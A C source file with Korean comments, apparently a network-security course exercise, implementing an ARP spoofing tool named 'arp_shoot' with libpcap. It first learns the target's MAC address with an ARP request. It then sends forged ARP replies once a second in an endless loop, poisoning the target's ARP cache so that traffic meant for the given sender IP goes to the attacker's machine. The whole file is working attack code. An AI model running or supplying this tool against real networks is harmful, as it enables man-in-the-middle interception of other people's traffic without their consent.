#include <cassert>
#include <cstdio>
#include <cstdlib>
#include <cstdint>

#include <arpa/inet.h>
#include <pcap.h>
#include <netinet/in.h> // in_addr
#include <netinet/ether.h> // ether + arp
#include <unistd.h>

#include "netfunc.h"

// 상수들
#define MY_BUF_LEN 128
#define ARP_PACKET_LEN (sizeof(struct ether_header) + sizeof(struct ether_arp))

// 예외처리 함수
#undef RAGE_QUIT
#define RAGE_QUIT(...) do{fprintf(stderr,__VA_ARGS__);exit(-1);}while(0)

void usage() {
	puts("Usage: arp_shoot <interface> <send_ip> <target_ip>");
	exit(-1);
}

int main(int argc, char *argv[]) {
	static char ebuf[PCAP_ERRBUF_SIZE]; // pcap 에러 메시지 버퍼
	static char my_buf[MY_BUF_LEN];
	static uint8_t arp_packet_buf[ARP_PACKET_LEN];
	if (argc != 4) usage();

	const char *network   = argv[1];
	const char *send_ip   = argv[2];
	const char *target_ip = argv[3];

	pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, ebuf);
	if (!handle) RAGE_QUIT("Cannot open device: %s\n", ebuf);

	// target ip의 MAC address를 찾자
	struct in_addr target_ip_addr;
	struct in_addr send_ip_addr;
	struct in_addr my_ip_addr;
	struct ether_addr my_mac_addr;
	struct ether_addr target_mac_addr;
	struct ether_addr allf_mac_addr;
	struct ether_addr all0_mac_addr;
	{
		int ret;
		// 일단 ip를 변환하자
		ret = inet_pton(AF_INET, target_ip, &target_ip_addr);
		if (ret != 1) RAGE_QUIT("Cannot convert target ip: %s\n", target_ip);

		ret = inet_pton(AF_INET, send_ip, &send_ip_addr);
		if (ret != 1) RAGE_QUIT("Cannot convert send ip: %s\n", send_ip);

		// 내 ip address를 찾는다
		ret = getMyIPAddress(network, my_buf, MY_BUF_LEN);
		if (ret != 0) RAGE_QUIT("Cannot get ip address\n");

		printf("My IP: %s\n", my_buf);

		ret = inet_pton(AF_INET, my_buf, &my_ip_addr);
		if (ret != 1) RAGE_QUIT("Cannot convert ip address: %s\n", my_buf);

		// 내 MAC address를 찾는다
		ret = getMyMACAddress(network, my_buf, MY_BUF_LEN);
		if (ret != 0) RAGE_QUIT("Cannot get MAC Address\n");

		printf("My MAC: %s\n", my_buf);

		ether_aton_r(my_buf, &my_mac_addr);

		// 00:00:00:00:00:00, ff:ff:ff:ff:ff:ff 를 변환
		ether_aton_r("ff:ff:ff:ff:ff:ff", &allf_mac_addr);
		ether_aton_r("00:00:00:00:00:00", &all0_mac_addr);

		// arp 패킷 생성
		create_eth_arp(arp_packet_buf,
			my_mac_addr, allf_mac_addr,
			ARPOP_REQUEST,
			my_mac_addr, all0_mac_addr,
			my_ip_addr, target_ip_addr
		);

		// shoot!
		ret = pcap_inject(handle, arp_packet_buf, ARP_PACKET_LEN);
		if (ret == -1) RAGE_QUIT("Cannot send ARP request: %s\n", ebuf);

		printf("Shoot ARP request\n");
	}

	// 아까 보낸 패킷의 arp reply를 찾아보자
	for (;;) {
		struct pcap_pkthdr *header;
		const uint8_t *packet;

		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		else if (res == -1 || res == -2) break;

		if (is_arp_reply(header->caplen, packet, target_ip_addr, &target_mac_addr)) break;
	}

	ether_ntoa_r(&target_mac_addr, my_buf);
	printf("Found ARP reply. Target MAC: %s\n", my_buf);

	// Shooting star
	for(;;) {
		create_eth_arp(arp_packet_buf,
			my_mac_addr, target_mac_addr,
			ARPOP_REPLY,
			my_mac_addr, target_mac_addr,
			send_ip_addr, target_ip_addr
		);

		int ret = pcap_inject(handle, arp_packet_buf, ARP_PACKET_LEN);
		if (ret == -1) RAGE_QUIT("Failed to send ARP reply\n");

		printf("Send ARP reply...\n");

		// 잠시 쉰다
		sleep(1);
	}

	return 0;
}
